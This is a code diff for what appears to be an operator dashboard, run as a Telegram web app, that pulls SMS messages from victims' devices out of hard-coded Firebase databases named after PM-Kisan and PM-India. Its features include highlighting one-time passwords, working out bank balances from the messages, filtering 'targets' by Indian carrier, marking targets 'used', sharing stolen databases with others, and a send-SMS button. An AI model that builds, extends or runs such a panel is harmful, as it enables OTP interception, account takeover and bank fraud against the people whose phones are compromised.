 .modal-badges { display: flex; gap: 5px; margin-top: 5px;}
+.modal-mini-btn { min-width:82px; height:28px; padding:0 10px; border-radius:8px; background:rgba(0,0,2,.7); font-size:9px; font-weight:900; letter-spacing:1px; cursor:pointer; transition:.2s; text-transform:uppercase; }
+.modal-mini-btn:active { transform:scale(.94); }
+.modal-mini-btn.next-target-btn { border:1px solid rgba(0,183,255,.85); color:#00b7ff; box-shadow:0 0 12px rgba(0,183,255,.42), inset 0 0 12px rgba(0,183,255,.05); }
+.modal-mini-btn.send-sms-btn { border:1px solid rgba(255,51,102,.88); color:#ff668a; box-shadow:0 0 12px rgba(255,51,102,.42), inset 0 0 12px rgba(255,51,102,.05); }
 
 .modal-controls { display: flex; gap: 8px; align-items: center; width: 100%; overflow-x: auto; padding-bottom: 5px;}
 .modal-controls::-webkit-scrollbar { display: none; }
+.modal-quick-actions { position:absolute; right:72px; top:42px; display:flex; gap:8px; z-index:4; }
+.modal-quick-actions .modal-mini-btn { min-width:104px; height:27px; font-size:8px; display:inline-flex; align-items:center; justify-content:center; }
 .filter-sms-input { flex: 1; min-width: 100px; padding: 8px 10px; border-radius: 8px; font-size: 11px; font-weight: 600; background: #020204; border: 1px solid var(--obsidian-border); color: var(--text-bright); font-family: 'Inter', sans-serif; outline: none; transition: 0.3s; box-shadow: inset 0 0 10px rgba(0,0,0,0.8); }
 .filter-sms-input:focus { border-color: #3f3f46; box-shadow: 0 0 15px var(--obsidian-glow-strong); }
 .filter-sms-input::placeholder { color: var(--text-dim); font-weight: 400;}
 .set-btn, .act-btn { padding: 8px 12px; border-radius: 8px; font-size: 10px; font-weight: 800; cursor: pointer; transition: 0.2s; white-space: nowrap; background: transparent; color: var(--text-bright); border: 1px solid var(--obsidian-border); box-shadow: 0 0 10px var(--obsidian-glow); text-transform: uppercase;}
 .set-btn:active, .act-btn:active { transform: scale(0.9); }
-.act-btn.used-active { background: rgba(194, 64, 255, 0.1); border-color: var(--primary); color: var(--text-bright); box-shadow: 0 0 10px rgba(194,64,255,0.4); }
-.act-btn.fav-active { background: rgba(216, 180, 254, 0.1); border-color: #d8b4fe; color: #d8b4fe; box-shadow: 0 0 10px rgba(216,180,254,0.4); }
+.act-btn.used-active { background: rgba(var(--primary-rgb), 0.1); border-color: var(--primary); color: var(--text-bright); box-shadow: 0 0 10px rgba(var(--primary-rgb),0.4); }
+.act-btn.fav-active { background: rgba(var(--primary-rgb), 0.1); border-color: var(--primary-glow); color: var(--primary-glow); box-shadow: 0 0 10px rgba(var(--primary-rgb),0.4); }
 .close-modal { background: none; border: none; color: var(--primary); font-size: 28px; cursor: pointer; transition: 0.2s; line-height: 1; padding: 0; margin-left: auto; text-shadow: 0 0 10px var(--primary);}
 .close-modal:active { transform: scale(0.9); }
+@media (max-width:480px) {
+  #targetModal .modal-header { padding: 16px 14px 9px; gap: 11px; }
+  #targetModal .modal-title { font-size: 15px; letter-spacing:.35px; }
+  #targetModal #m-device-cluster { font-size:7px; letter-spacing:.7px; }
+  #targetModal .modal-title-area { min-width:0; }
+  .modal-mini-btn { padding:0 8px; font-size:8px; }
+  .modal-quick-actions { right:45px; top:24px; gap:4px; }
+  .modal-quick-actions .modal-mini-btn { min-width:68px; height:24px; font-size:7px; padding:0 6px; }
+  #targetModal .close-modal { font-size:25px; }
+}
 
-.modal-body { padding: 5px 20px 120px 20px; flex: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 15px; }
+.modal-body { padding: 5px 20px 20px 20px; flex: 1; min-height: 0; overflow: hidden; display: flex; flex-direction: column; gap: 15px; }
 .modal-body::-webkit-scrollbar { display: none; }
 
 /* 🔥 TOP PADDING INSIDE CARD REDUCED 🔥 */
@@ -228,20 +418,24 @@ html, body {
 .live-indicator { position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%); font-size: 28px; opacity: 0.05; transition: 0.2s; pointer-events: none; filter: grayscale(1); color: var(--text-bright); z-index: 3;}
 .live-indicator.flash { opacity: 1; filter: drop-shadow(0 0 15px var(--primary)) drop-shadow(0 0 30px var(--text-bright)); transform: translate(-50%, -50%) scale(1.4); color: var(--text-bright); }
 
-.sms-terminal { flex: 1; border-radius: 15px; padding: 15px; border: 1px solid transparent; background: #020204; display: flex; flex-direction: column; position: relative; overflow: visible;}
+.sms-terminal { flex: 1; min-height: 0; border-radius: 15px; padding: 15px; border: 1px solid transparent; background: #020204; display: flex; flex-direction: column; position: relative; overflow: visible;}
 .sms-terminal > *:not(.outline-edge) { position: relative; z-index: 2; }
 .sms-header { font-size: 11px; color: var(--text-bright); font-family: 'JetBrains Mono', monospace; font-weight: 800; margin-bottom: 10px; text-transform: uppercase; border-bottom: 1px dashed var(--obsidian-border); padding-bottom: 5px; display: flex; justify-content: space-between; align-items: center; }
-.clear-btn { padding: 3px 10px; border-radius: 6px; font-size: 9px; background: transparent; border: 1px solid var(--primary); color: var(--primary); cursor: pointer; font-family: 'JetBrains Mono', monospace; font-weight: 900; transition: 0.2s; box-shadow: 0 0 10px rgba(194,64,255,0.2);}
+.clear-btn { padding: 3px 10px; border-radius: 6px; font-size: 9px; background: transparent; border: 1px solid var(--primary); color: var(--primary); cursor: pointer; font-family: 'JetBrains Mono', monospace; font-weight: 900; transition: 0.2s; box-shadow: 0 0 10px rgba(var(--primary-rgb),0.2);}
 .clear-btn:active { background: var(--primary); color: #fff; }
 
-.sms-feed { flex: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 15px; padding-right: 5px;}
+.sms-feed { flex: 1; min-height: 0; overflow-y: auto; overscroll-behavior: contain; -webkit-overflow-scrolling: touch; touch-action: pan-y; display: flex; flex-direction: column; gap: 15px; padding-right: 5px;}
 .sms-feed::-webkit-scrollbar { width: 4px; }
 .sms-feed::-webkit-scrollbar-thumb { background: var(--obsidian-border); border-radius: 10px; }
 
 .msg-bubble { padding: 10px; border-radius: 0 10px 10px 0; background: transparent; border: 1px solid transparent; border-left: 3px solid var(--primary); animation: slideIn 0.3s ease-out forwards; position: relative; overflow: visible;}
 .msg-bubble > *:not(.outline-edge) { position: relative; z-index: 2; }
+.msg-bubble.otp-priority { border-left-color:#00e5ff; background:rgba(0,229,255,.035); --edge-main-color:rgba(0,229,255,.44); --edge-accent-color:rgba(216,180,254,.8); --edge-main-shadow:0 0 10px rgba(0,229,255,.16); --edge-opacity:.62; --edge-corner-opacity:.72; }
+.otp-priority-tag { position:absolute; top:8px; right:9px; padding:2px 6px; border:1px solid rgba(0,229,255,.55); border-radius:4px; color:#00e5ff; background:rgba(0,229,255,.06); font-family:'JetBrains Mono', monospace; font-size:8px; font-weight:800; letter-spacing:1px; text-shadow:0 0 8px rgba(0,229,255,.8); }
+.msg-bubble > .otp-priority-tag { position:absolute; z-index:3; }
+.msg-bubble.otp-priority .msg-sender { color:var(--primary-glow); padding-right:86px; }
 @keyframes slideIn { from { transform: translateX(-10px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
-.msg-sender { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-bright); margin-bottom: 4px; font-weight: 800; text-shadow: 0 0 8px rgba(194,64,255,.4); }
+.msg-sender { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-bright); margin-bottom: 4px; font-weight: 800; text-shadow: 0 0 8px rgba(var(--primary-rgb),.4); }
 .msg-time { display: block; font-size: 9px; color: var(--text-dim); font-family: 'Inter', sans-serif; font-weight: normal; margin-top: 2px;}
 .msg-text { font-size: 12px; color: var(--text-main); line-height: 1.4; word-break: break-word; font-weight: 500;}
 
@@ -257,7 +451,7 @@ html, body {
     --edge-opacity: .34;
     --edge-main-color: rgba(224, 214, 246, .38);
     --edge-accent-color: rgba(235, 240, 248, .46);
-    --edge-main-shadow: 0 0 2px rgba(235,240,250,.18), 0 0 7px rgba(194,64,255,.12);
+    --edge-main-shadow: 0 0 2px rgba(235,240,250,.18), 0 0 7px rgba(var(--primary-rgb),.12);
     --edge-corner-size: 26px;
     --edge-corner-opacity: .55;
     transition: box-shadow .22s ease, border-color .22s ease, transform .22s ease;
@@ -348,7 +542,7 @@ html, body {
     --edge-opacity: .76;
     --edge-main-color: rgba(235, 240, 248, .74);
     --edge-accent-color: rgba(255, 255, 255, .82);
-    --edge-main-shadow: 0 0 2px rgba(255,255,255,.38), 0 0 8px rgba(210,220,235,.34), 0 0 16px rgba(194,64,255,.18);
+    --edge-main-shadow: 0 0 2px rgba(255,255,255,.38), 0 0 8px rgba(210,220,235,.34), 0 0 16px rgba(var(--primary-rgb),.18);
     --edge-corner-opacity: .9;
 }
 .target-modal.open .msg-bubble.outline-card {
@@ -492,8 +686,25 @@ body.app-background-paused #obsidian-core-glow,
 body.app-background-paused .p,
 body.app-background-paused .void-sweep::after,
 body.app-background-paused .scan-progress-card::before,
-body.app-background-paused .scan-progress-card::after {
+body.app-background-paused .scan-progress-card::after,
+body.app-scrolling .fog1,
+body.app-scrolling .fog2,
+body.app-scrolling .fog3,
+body.app-scrolling #obsidian-core-glow,
+body.app-scrolling .p,
+body.app-scrolling .void-sweep::after,
+body.app-scrolling .scan-progress-card::before,
+body.app-scrolling .scan-progress-card::after {
   animation-play-state: paused;
+}
+
+@media (pointer: coarse) {
+  .fog { filter: blur(24px); opacity: .20; }
+  .fog1, .fog2, .fog3 { animation-duration: 36s; }
+  #obsidian-core-glow { animation-duration: 16s; }
+  .void-sweep::after { animation-duration: 14s; }
+  .target-modal { backdrop-filter: none; }
+  .msg-bubble { animation: none; }
 }
 
 @media (prefers-reduced-motion: reduce) {
@@ -516,7 +727,7 @@ body.app-background-paused .scan-progress-card::after {
 .scan-live-target-stats { display:block; color:#d9fbff; font-size:9px; margin-top:4px; letter-spacing:.65px; text-shadow:0 0 8px rgba(0,229,255,0.45); font-family:'JetBrains Mono', monospace; }
 @keyframes scanLivePulse { 50% { filter:brightness(1.28); } }
 .target-card-wrapper.unreg-target-card .target-wireframe { border-color:rgba(0,183,255,0.58); box-shadow:0 0 18px rgba(0,183,255,0.18); --edge-main-color:rgba(0,183,255,.78); --edge-accent-color:rgba(0,229,255,.9); --edge-main-shadow:0 0 2px rgba(0,229,255,.55), 0 0 13px rgba(0,183,255,.34); --edge-opacity:.82; --edge-corner-opacity:.92; }
-.unreg-target-tag { position:absolute; top:-11px; right:16px; z-index:12; padding:4px 10px; border-radius:999px; border:1px solid rgba(0,183,255,0.72); background:#020204; color:#00b7ff; font-size:8px; font-weight:900; letter-spacing:1px; text-shadow:0 0 10px rgba(0,183,255,0.9); box-shadow:0 0 13px rgba(0,183,255,0.35); }
+.unreg-target-tag { position:absolute; top:0; right:16px; z-index:12; padding:4px 10px; border-radius:999px; border:1px solid rgba(0,183,255,0.72); background:#020204; color:#00b7ff; font-size:8px; font-weight:900; letter-spacing:1px; text-shadow:0 0 10px rgba(0,183,255,0.9); box-shadow:0 0 13px rgba(0,183,255,0.35); }
 @media (max-width:480px) {
   .scan-progress-title { font-size:25px; letter-spacing:2px; }
   .scan-stat-grid { grid-template-columns:1fr 1fr; }
@@ -557,17 +768,13 @@ body.app-background-paused .scan-progress-card::after {
   <div class="icon-btn">👤</div>
 </div>
 
-<div class="hero">
+<div class="hero app-hero">
   <div class="hero-info">
       <p>Welcome Back</p>
       <h1>X</h1>
       <div class="subtext">Control the energy. Master the void.</div>
       <div class="glow-line"></div>
   </div>
-</div>
-
-<div class="hero-search">
-  <input type="text" id="target-search-input" class="global-search" placeholder="🔍 Search Target..." oninput="renderFilteredList()" onfocus="forceTargetsScreen()">
 </div>
 
 <div class="swipeWrap">
@@ -611,7 +818,7 @@ body.app-background-paused .scan-progress-card::after {
       <div class="input-content">
         <h3>Configuration</h3>
         <h2>CONNECT YOUR FIREBASE</h2>
-        <p>YOU CAN CONNECT MAX 2 FIREBASES IN ONE TIME</p>
+        <p>CONNECT AND MANAGE YOUR FIREBASES IN ONE PLACE</p>
       </div>
       <div class="input-action">
         <input type="text" id="db-input-url" class="cyber-input" placeholder="Paste bulk text...">
@@ -623,22 +830,31 @@ body.app-background-paused .scan-progress-card::after {
       <span class="outline-edge outline-main" aria-hidden="true"></span>
       <span class="outline-edge outline-micro" aria-hidden="true"></span>
       <div class="input-content">
-        <h3>YOUR FIREBASES</h3>
+        <div class="firebase-panel-head">
+          <h3>YOUR FIREBASES</h3>
+          <div class="firebase-toolbar">
+            <div class="firebase-menu-wrap">
+              <button class="firebase-command" onclick="toggleFirebaseMenu('connect')">CONNECT</button>
+              <button class="firebase-menu-toggle" aria-label="Connect options" onclick="toggleFirebaseMenu('connect')">▾</button>
+              <div class="firebase-action-menu" id="connect-action-menu">
+                <button onclick="connectAllFirebases()">ALL</button>
+                <button onclick="openBulkFirebaseModal('connect-select')">SELECT</button>
+                <button onclick="openBulkFirebaseModal('connect-high')">ONLY HIGH TARGETS</button>
+              </div>
+            </div>
+            <div class="firebase-menu-wrap delete-menu-wrap">
+              <button class="firebase-command delete-command" onclick="toggleFirebaseMenu('delete')">DELETE</button>
+              <button class="firebase-menu-toggle" aria-label="Delete options" onclick="toggleFirebaseMenu('delete')">▾</button>
+              <div class="firebase-action-menu delete-menu" id="delete-action-menu">
+                <button onclick="deleteAllFirebases()">DELETE ALL</button>
+                <button onclick="removeDeactivatedFirebases()">REMOVE DEACTIVATED FBS</button>
+                <button onclick="openBulkFirebaseModal('delete-select')">SELECT</button>
+              </div>
+            </div>
+          </div>
+        </div>
         <div id="firebase-list-container">
           <div class="empty-state">No firebases connected yet.</div>
-        </div>
-      </div>
-    </div>
-
-    <div class="status-card void-sweep outline-card" style="margin-top: 15px;">
-      <span class="outline-edge outline-main" aria-hidden="true"></span>
-      <span class="outline-edge outline-micro" aria-hidden="true"></span>
-      <div class="input-content">
-        <h3>SHARE WEB PANEL</h3>
-        <p>Generate a magic link to inject your databases directly into your friend's panel.</p>
-        <div class="input-action">
-          <input type="text" id="share-name" class="cyber-input" placeholder="Your Hacker Alias (Optional)...">
-          <button class="cyber-btn" onclick="openShareModal()">GET LINK</button>
         </div>
       </div>
     </div>
@@ -647,6 +863,28 @@ body.app-background-paused .scan-progress-card::after {
 
   <div class="screen next">
     <div style="padding-top: 5px;">
+        <div class="hero target-scroll-hero">
+          <div class="hero-info">
+              <p>Welcome Back</p>
+              <h1>X</h1>
+              <div class="subtext">Control the energy. Master the void.</div>
+              <div class="glow-line"></div>
+          </div>
+        </div>
+        <div class="hero-search target-scroll-search">
+          <div class="carrier-filter-row">
+            <div class="carrier-filter-wrap">
+              <input type="text" id="carrier-filter-input" class="carrier-filter-input" value="ALL CARRIERS" readonly onclick="event.stopPropagation(); toggleCarrierFilterMenu()" onpointerdown="event.stopPropagation()">
+              <div class="carrier-filter-menu" id="carrier-filter-menu">
+                <button type="button" data-carrier="JIO" onclick="event.stopPropagation(); selectCarrierFilter('JIO')">JIO</button>
+                <button type="button" data-carrier="AIRTEL" onclick="event.stopPropagation(); selectCarrierFilter('AIRTEL')">AIRTEL</button>
+                <button type="button" data-carrier="VI" onclick="event.stopPropagation(); selectCarrierFilter('VI')">VI</button>
+              </div>
+            </div>
+            <button type="button" class="carrier-reset-btn" onclick="resetCarrierFilter()">RESET</button>
+          </div>
+          <input type="text" id="target-search-input" class="global-search" placeholder="🔍 Search Target..." oninput="renderFilteredList()">
+        </div>
         <div class="scan-live-target-bar" id="scan-live-target-bar">
             <button class="scan-live-target-btn scan-live-stop-btn" id="scan-live-stop-btn" onclick="stopLiveScanMode()">STOP</button>
             <div class="scan-live-target-title">
@@ -692,11 +930,15 @@ body.app-background-paused .scan-progress-card::after {
             </div>
             <button class="close-modal" onclick="closeTargetModal()">&times;</button>
         </div>
+        <div class="modal-quick-actions">
+            <button class="modal-mini-btn send-sms-btn" onclick="openSendSmsStub()">SEND SMS</button>
+            <button class="modal-mini-btn next-target-btn" onclick="openNextTarget()">NEXT</button>
+        </div>
         <div class="modal-controls">
             <input type="text" id="sms-filter-input" class="filter-sms-input" placeholder="App/OTP Filter...">
             <button class="set-btn" onclick="applySmsFilter()">SET</button>
             <button class="act-btn" id="btn-used" onclick="toggleUsed()">MARK USED</button>
-            <button class="act-btn" id="btn-fav" onclick="toggleFav()">⭐ FAV</button>
+                    <button class="act-btn" id="btn-fav" onclick="toggleFav()">⭐ FAV</button>
         </div>
     </div>
     <div class="modal-body">
@@ -746,18 +988,85 @@ body.app-background-paused .scan-progress-card::after {
 <div class="target-modal" id="shareModal">
     <div class="modal-header">
         <div class="modal-title-row">
-            <h2 class="modal-title">SELECT DATABASES</h2>
+            <div class="modal-title-area">
+                <h2 class="modal-title" id="share-modal-title">SELECT FIREBASES</h2>
+                <p class="share-step-copy" id="share-step-copy">Choose the Firebase nodes to include in this share.</p>
+            </div>
             <button class="close-modal" onclick="closeShareModal()">&times;</button>
         </div>
     </div>
-    <div class="modal-body" id="share-db-list" style="padding-bottom: 20px;"></div>
-    <div style="padding: 20px;">
-        <button class="cyber-btn" style="width: 100%; padding: 15px; text-align:center; font-size: 14px;" onclick="generateLink()">GENERATE MAGIC LINK 🚀</button>
+    <div class="bulk-modal-body" id="share-selection-panel">
+        <div class="share-selection-count" id="share-selection-count">0 FIREBASES SELECTED</div>
+        <div id="share-db-list"></div>
     </div>
-    <div id="share-result" style="padding: 0 20px 20px 20px; display: none;">
+    <div class="bulk-modal-body" id="share-link-panel" style="display:none;">
+        <div class="share-type-grid">
+            <button class="share-type-card" type="button" data-share-type="custom" onclick="selectShareLinkType('custom')">
+                <span class="share-type-title">CUSTOM URL</span>
+                <span class="share-type-desc">Create a readable link name for the selected Firebase nodes.</span>
+            </button>
+            <button class="share-type-card" type="button" data-share-type="default" onclick="selectShareLinkType('default')">
+                <span class="share-type-title">DEFAULT SECURE LINK</span>
+                <span class="share-type-desc">Create a random secure link ID for the selected Firebase nodes.</span>
+            </button>
+        </div>
+        <div class="share-protection-title">RECIPIENT ACCESS</div>
+        <div class="share-protection-grid">
+            <button class="share-protection-card" type="button" data-share-protection="public" onclick="selectShareProtection('public')">CREATE PUBLIC LINK</button>
+            <button class="share-protection-card" type="button" data-share-protection="password" onclick="selectShareProtection('password')">PASS PROTECTED</button>
+        </div>
+        <div class="share-field" id="share-custom-field">
+            <input type="text" id="share-custom-alias" class="cyber-input" maxlength="60" placeholder="Custom URL name, e.g. team-october">
+        </div>
+        <div class="share-field" id="share-password-field">
+            <input type="password" id="share-password" class="cyber-input" maxlength="128" placeholder="Recipient password (minimum 8 characters)">
+        </div>
+        <div id="share-result" style="padding-top:16px; display:none;">
         <input type="text" id="share-link-out" class="cyber-input" readonly style="width: 100%; box-sizing: border-box; margin-bottom: 10px; font-family: 'JetBrains Mono', monospace; font-size: 10px;">
-        <button class="cyber-btn" style="width: 100%; padding: 12px;" onclick="copyShareLink()">📋 COPY LINK</button>
+        <button class="cyber-btn" style="width: 100%; padding: 12px;" onclick="copyShareLink()">COPY LINK</button>
+        </div>
     </div>
+    <div class="share-footer">
+        <button class="cyber-btn" id="share-back-btn" type="button" style="display:none;" onclick="showShareSelectionStep()">BACK</button>
+        <button class="cyber-btn" id="share-next-btn" type="button" onclick="showShareLinkStep()">CONTINUE</button>
+    </div>
+</div>
+
+<!-- SHARE UNLOCK MODAL -->
+<div class="target-modal" id="shareUnlockModal">
+    <div class="modal-header">
+        <div class="modal-title-row">
+            <div class="modal-title-area">
+                <h2 class="modal-title">PROTECTED SHARE</h2>
+                <p class="share-step-copy" id="share-unlock-copy">Enter the password to import this Firebase share.</p>
+            </div>
+            <button class="close-modal" onclick="closeShareUnlockModal()">&times;</button>
+        </div>
+        <input type="password" id="share-unlock-password" class="filter-sms-input" maxlength="128" placeholder="Share password" onkeydown="if(event.key==='Enter') unlockSecureShare()">
+    </div>
+    <div class="share-footer">
+        <button class="cyber-btn" type="button" onclick="unlockSecureShare()">UNLOCK SHARE</button>
+    </div>
+</div>
+
+<!-- BULK FIREBASE ACTIONS -->
+<div class="target-modal" id="bulkFirebaseModal">
+    <div class="modal-header">
+        <div class="modal-title-row">
+            <div class="modal-title-area">
+                <h2 class="modal-title" id="bulk-firebase-title">SELECT FIREBASES</h2>
+                <div id="bulk-firebase-subtitle">Choose the Firebase nodes for this action.</div>
+            </div>
+            <button class="close-modal" onclick="closeBulkFirebaseModal()">&times;</button>
+        </div>
+    </div>
+    <div class="bulk-minimum" id="bulk-minimum-wrap" style="display:none;">
+        <p>ENTER THE NO. OF MINIMUM TARGETS YOU WANT ONLINE IN A FIREBASE</p>
+        <input class="cyber-input" id="bulk-minimum-input" inputmode="numeric" maxlength="3" pattern="[0-9]*" placeholder="Minimum online targets (1-999)">
+        <div id="bulk-high-status" style="min-height:18px; padding-top:10px; color:var(--text-dim); font-size:10px; font-family:'JetBrains Mono', monospace;"></div>
+    </div>
+    <div class="bulk-modal-body" id="bulk-firebase-list"></div>
+    <div class="bulk-footer"><button class="cyber-btn" id="bulk-firebase-action" onclick="applyBulkFirebaseAction()">CONNECT SELECTED</button></div>
 </div>
 
 <div class="nav-container">
@@ -783,6 +1092,70 @@ function cyberConfirm(msg, callback) {
     document.getElementById('confirm-yes').onclick = () => { box.style.display = 'none'; callback(); };
     document.getElementById('confirm-no').onclick = () => { box.style.display = 'none'; };
     try { if (tg && tg.HapticFeedback) tg.HapticFeedback.impactOccurred('medium'); } catch(e){}
+}
+
+// ===================== THEME SWITCHER =====================
+const APP_THEMES = [
+    { key: 'void', label: 'VOID PURPLE' },
+    { key: 'matrix', label: 'MATRIX GREEN' },
+    { key: 'ice', label: 'ICE BLUE' },
+    { key: 'alert', label: 'RED ALERT' },
+    { key: 'gold', label: 'NEON GOLD' }
+];
+let currentThemeKey = 'void';
+
+function getStoredTheme() {
+    try {
+        const saved = localStorage.getItem('void_theme') || 'void';
+        return APP_THEMES.some(theme => theme.key === saved) ? saved : 'void';
+    } catch(e) {
+        return 'void';
+    }
+}
+
+function applyTheme(themeKey, persist = true) {
+    const nextTheme = APP_THEMES.some(theme => theme.key === themeKey) ? themeKey : 'void';
+    currentThemeKey = nextTheme;
+    document.body.setAttribute('data-theme', nextTheme);
+    const activeTheme = APP_THEMES.find(theme => theme.key === nextTheme) || APP_THEMES[0];
+    const label = document.getElementById('theme-current-label');
+    if (label) label.textContent = activeTheme.label.replace(' ', ' ');
+    document.querySelectorAll('.theme-option').forEach(btn => {
+        btn.classList.toggle('active', btn.dataset.themeKey === nextTheme);
+    });
+    if (persist) {
+        try { localStorage.setItem('void_theme', nextTheme); } catch(e) {}
+        showToast('THEME SET: ' + activeTheme.label);
+    }
+}
+
+function closeThemeMenu() {
+    const menu = document.getElementById('theme-menu');
+    if (menu) menu.classList.remove('open');
+}
+
+function toggleThemeMenu(event) {
+    if (event) event.stopPropagation();
+    const menu = document.getElementById('theme-menu');
+    if (!menu) return;
+    menu.classList.toggle('open');
+}
+
+function selectTheme(themeKey, event) {
+    if (event) event.stopPropagation();
+    applyTheme(themeKey, true);
+    closeThemeMenu();
+}
+
+function renderThemeMenu() {
+    const menu = document.getElementById('theme-menu');
+    if (!menu) return;
+    menu.innerHTML = APP_THEMES.map(theme => `
+      <button class="theme-option" data-theme-key="${theme.key}" onclick="selectTheme('${theme.key}', event)">
+        <span class="theme-swatch"></span><span>${theme.label}</span>
+      </button>
+    `).join('');
+    applyTheme(currentThemeKey, false);
 }
 
 // ===================== SHADOW ACCOUNTING ENGINE =====================
@@ -841,22 +1214,35 @@ function calculateBankBalances(smsDict) {
     } catch(err) { return []; }
 }
 
+function getCachedBankBalances(target) {
+    let smsDict = target && target.smsDict && typeof target.smsDict === 'object' ? target.smsDict : {};
+    let keys = Object.keys(smsDict);
+    let cacheKey = keys.length ? `${keys.length}:${keys[keys.length - 1]}` : '0';
+    if (target._bankBalanceCache && target._bankBalanceCache.key === cacheKey) return target._bankBalanceCache.value;
+    let value = calculateBankBalances(smsDict);
+    target._bankBalanceCache = { key: cacheKey, value };
+    return value;
+}
+
 // ===================== FLICKER SCRIPT =====================
-let flicker = 0;
-function edgeFlicker() { flicker++; if (flicker % 3 === 0) document.documentElement.style.setProperty("--edge-opacity", 0.82 + Math.random() * 0.18); requestAnimationFrame(edgeFlicker); }
-edgeFlicker();
+const hasCoarsePointer = window.matchMedia && window.matchMedia('(pointer: coarse)').matches;
+function edgeFlicker() { document.documentElement.style.setProperty("--edge-opacity", 0.82 + Math.random() * 0.18); }
+if (!hasCoarsePointer) setInterval(edgeFlicker, 900);
 
 // ===================== GLOBAL VARS & LOCAL STORAGE =====================
 const outlineEdgesHTML = `<span class="outline-edge outline-main" aria-hidden="true"></span><span class="outline-edge outline-micro" aria-hidden="true"></span>`;
 const svgWebOverlay = `<div class="card-web-overlay"><svg viewBox="0 0 1000 250" preserveAspectRatio="none" xmlns="http://www.w3.org/2000/svg"><g fill="none" stroke="rgba(232,226,249,0.72)" stroke-width="1.5" opacity="0.6"><path d="M500 10 L650 0 L800 30 L1000 5"/><path d="M520 65 L680 25 L830 100 L1000 50"/><path d="M470 145 L630 90 L790 175 L1000 115"/><path d="M540 250 L700 155 L880 225 L1000 180"/><path d="M500 10 L520 65 L470 145"/><path d="M650 0 L680 25 L630 90 L540 250"/><path d="M800 30 L830 100 L790 175 L700 155"/><path d="M520 65 L650 0 L680 25 L630 90 L470 145"/><path d="M680 25 L800 30 L830 100 L630 90"/><path d="M630 90 L830 100 L790 175 L540 250"/><path d="M790 175 L880 225 L1000 180"/><path d="M550 5 Q630 55 610 110 Q650 160 720 240"/><path d="M720 0 Q690 75 760 125 Q840 165 820 245"/><path d="M920 5 Q860 80 930 150 Q970 185 1000 220"/></g></svg></div>`;
 
 let tg; try { tg = window.Telegram?.WebApp; if(tg) tg.expand(); } catch(e) {}
-let usedTargets = []; let favTargets = []; let clearedTimes = {}; let ghostVault = {};
+currentThemeKey = getStoredTheme();
+applyTheme(currentThemeKey, false);
+let usedTargets = []; let favTargets = []; let clearedTimes = {}; let ghostVault = {}; let removedFirebaseUrls = [];
 try { 
     usedTargets = JSON.parse(localStorage.getItem('void_used')) || []; 
     favTargets = JSON.parse(localStorage.getItem('void_fav')) || []; 
     clearedTimes = JSON.parse(localStorage.getItem('void_cleared')) || {}; 
     ghostVault = JSON.parse(localStorage.getItem('void_vault')) || {};
+    removedFirebaseUrls = JSON.parse(localStorage.getItem('void_removed_firebase_urls')) || [];
 } catch(e) {}
 
 function saveStorage() { 
@@ -865,7 +1251,21 @@ function saveStorage() {
         localStorage.setItem('void_fav', JSON.stringify(favTargets)); 
         localStorage.setItem('void_cleared', JSON.stringify(clearedTimes)); 
         localStorage.setItem('void_vault', JSON.stringify(ghostVault)); 
+        localStorage.setItem('void_removed_firebase_urls', JSON.stringify(removedFirebaseUrls));
     } catch(e) {} 
+}
+
+function flushVaultSave() {
+    if (vaultSaveTimer) { clearTimeout(vaultSaveTimer); vaultSaveTimer = null; }
+    if (!vaultSavePending) return;
+    vaultSavePending = false;
+    saveStorage();
+}
+
+function requestVaultSave(delay = 250) {
+    vaultSavePending = true;
+    if (vaultSaveTimer) return;
+    vaultSaveTimer = setTimeout(flushVaultSave, delay);
 }
 
 function getVaultKey(dbUrl, did) {
@@ -875,20 +1275,21 @@ function getVaultKey(dbUrl, did) {
 const PERMANENT_FIREBASES_TEXT = `"https://parkashbhai-default-rtdb.firebaseio.com/.json", "https://pk114-6e828-default-rtdb.firebaseio.com/.json", "https://pk175-b429e-default-rtdb.firebaseio.com/.json", "https://please-2b091-default-rtdb.firebaseio.com/.json", "https://pm-india-07bhb-default-rtdb.firebaseio.com/.json", "https://pm-india-07y-gu-default-rtdb.firebaseio.com/.json", "https://pm-kisan-01hfg-default-rtdb.firebaseio.com/.json", "https://pm-kisan-03-9c8f7-default-rtdb.firebaseio.com/.json", "https://pm-kisan-05jg-default-rtdb.firebaseio.com/.json", "https://pm-kisan-13bguh-default-rtdb.firebaseio.com/.json", "https://pm-kisan-13gfh-default-rtdb.firebaseio.com/.json", "https://pm-kisan-17hh-default-rtdb.firebaseio.com/.json", "https://pm-kisan-18hgu-default-rtdb.firebaseio.com/.json", "https://pm-kisan-21gvh-default-rtdb.firebaseio.com/.json", "https://pm-kisan-22f92-default-rtdb.firebaseio.com/.json", "https://pm-kisan-25hxg-default-rtdb.firebaseio.com/.json"`;
 
 let firebaseList = []; let activeDatabases = []; let globalTargetsCache = []; 
-let currentFilter = 'GLOBAL'; let currentModalDid = null; let livePollingActive = false; let activeSmsFilter = ""; 
+let currentFilter = 'GLOBAL'; let currentModalDid = null; let livePollingActive = false; let activeSmsFilter = ""; let carrierFilter = "";
 let seenDevices = new Set(); let isInitialBoot = true;
 let isScanning = false; let liveSmsInterval = null; let bgQueue = []; let isBgProcessing = false; let isFbExpanded = false;
+let isTargetFetchInProgress = false; let pauseClientPollingForRegex = false; let regexFinalRefreshPending = false; let vaultSavePending = false; let vaultSaveTimer = null;
 
 // ===================== URL EXTRACTOR & FIREBASE LOGIC =====================
 function extractUrlsFromText(rawStr) { const regex = /([a-zA-Z0-9-]+)\.firebaseio\.com/gi; let matches = rawStr.match(regex); if (!matches) return []; return [...new Set(matches)].map(domain => `https://${domain.toLowerCase()}/.json`); }
-function addUrlToFirebaseList(url) { if (firebaseList.some(item => item.url === url)) return false; if (firebaseList.filter(item => item.isConnected).length >= 2) { showToast("LIMIT REACHED. DISCONNECT A NODE FIRST."); return false; } firebaseList.push({ url, isConnected: true }); activeDatabases.push(url); return true; }
-function addSharedUrlToFirebaseList(url) { if (firebaseList.some(item => item.url === url)) return 0; if (firebaseList.filter(item => item.isConnected).length < 2) { firebaseList.push({ url, isConnected: true }); activeDatabases.push(url); } else { firebaseList.push({ url, isConnected: false }); } return 1; }
